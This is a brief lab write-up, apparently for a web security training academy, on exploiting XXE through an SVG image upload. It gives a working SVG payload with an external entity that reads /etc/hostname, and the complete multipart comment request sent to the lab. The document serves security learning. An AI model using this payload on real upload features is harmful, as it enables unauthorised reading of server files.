# Lab: Exploiting XXE via image file upload
## Description

Had multiple failed attempts:
* Uploaded imges that were too big
* Uploaded JPG / PNG images with SVG payload
* When using SVG, and the image is blank, it means it was unable to fetct the correct data


## Solution
Created a bah.svg file with the following content:
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="40" x="10" y="40">&xxe;</text></svg>
```

Found the image in the blog post with the following data: `015458125e7f`

The final HTTP request looked like this:
```yaml
POST /post/comment HTTP/1.1
Host: ac961f8f1ec453e0c0f6cee0003d008f.web-security-academy.net
Content-Length: 1096
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoezmTiBcTxd9seO6

------WebKitFormBoundaryoezmTiBcTxd9seO6
Content-Disposition: form-data; name="csrf"

rf7CSuCXwAcrWXJJUIre0wjiZkuzm58e
------WebKitFormBoundaryoezmTiBcTxd9seO6
Content-Disposition: form-data; name="postId"

3
------WebKitFormBoundaryoezmTiBcTxd9seO6
Content-Disposition: form-data; name="comment"

asd
------WebKitFormBoundaryoezmTiBcTxd9seO6
Content-Disposition: form-data; name="name"

asd
------WebKitFormBoundaryoezmTiBcTxd9seO6
Content-Disposition: form-data; name="avatar"; filename="bah.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="40" x="10" y="40">&xxe;</text></svg>
------WebKitFormBoundaryoezmTiBcTxd9seO6
Content-Disposition: form-data; name="email"

test@test.com
------WebKitFormBoundaryoezmTiBcTxd9seO6
Content-Disposition: form-data; name="website"


------WebKitFormBoundaryoezmTiBcTxd9seO6--
```